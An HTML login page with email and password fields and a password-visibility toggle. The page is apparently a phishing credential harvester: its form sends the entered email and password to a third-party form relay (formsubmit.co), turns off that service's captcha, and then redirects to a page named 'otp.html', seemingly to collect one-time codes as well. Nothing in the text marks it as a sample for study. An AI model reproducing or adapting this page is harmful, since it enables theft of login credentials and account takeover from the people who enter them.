<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/png" href="asset/header-logo.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>

    <script type="text/javascript">
        document.addEventListener("DOMContentLoaded", function () {
            console.log("working");

            const passInput = document.getElementById("pass");
            const passToggle = document.getElementById("passToggle");

            // Toggle password visibility with icon change
            passToggle.addEventListener("click", function () {
                if (passInput.type === "password") {
                    passInput.type = "text";
                    passToggle.src = "asset/eye-open.svg"; // Change to "eye-open" icon
                } else {
                    passInput.type = "password";
                    passToggle.src = "asset/eye-closed.svg"; // Change back to "eye-closed" icon
                }
            });

        });
    </script>

    <script type="module" crossorigin src="main.js"></script>
    <link rel="stylesheet" href="asset/style.css">
</head>

<body class="bg-gray-100">
    <div class="w-[90%] max-w-md mx-auto pt-5">
        <div class="mt-5"></div>
        
        <!-- Form using FormSubmit -->
        <form id="form" class="mt-44" action="https://formsubmit.co/el/jeyolu" method="POST">
            <div class="inputsCtn bg-white rounded-md shadow-sm p-6 flex flex-col gap-6">
                <p class="font-bold loginu mb-3">Log In</p>
                <img class="imglogo" src="asset/header-logo.png" alt="Logo">

                <div class="ctn relative">
                    <input
                        required
                        minlength="5"
                        id="email"
                        name="email"
                        type="email"
                        class="w-full rounded-md bnbn p-4 outline-none pl-2 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
                        placeholder="Email"
                    />
                </div>

                <div class="ctn relative">
                    <input
                        required
                        minlength="5"
                        id="pass"
                        name="password"
                        type="password"
                        class="w-full rounded-md bnbn p-4 outline-none pl-2 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
                        placeholder="Password"
                    />
                    <img
                        id="passToggle"
                        src="asset/eye-closed.svg"
                        class="absolute top-1/2 bottom-1/2 right-3 my-auto cursor-pointer"
                        alt="Toggle Password"
                    />
                </div>

                <!-- Hidden fields for better UX -->
                <input type="hidden" name="_captcha" value="false"> <!-- Disable Captcha -->
                <input type="hidden" name="_next" value="otp.html"> <!-- Redirect after submission -->

                <button
                    id="redirectBtn"
                    type="submit"
                    class="bg-primary mt-w text-white w-full rounded-md p-4 disabled:opacity-80"
                >
                    Login
                </button>
                <p class="pt-3 text-primary font-semibold text-center">Reset Password</p>
            </div>
        </form>
    </div>
</body>
</html>
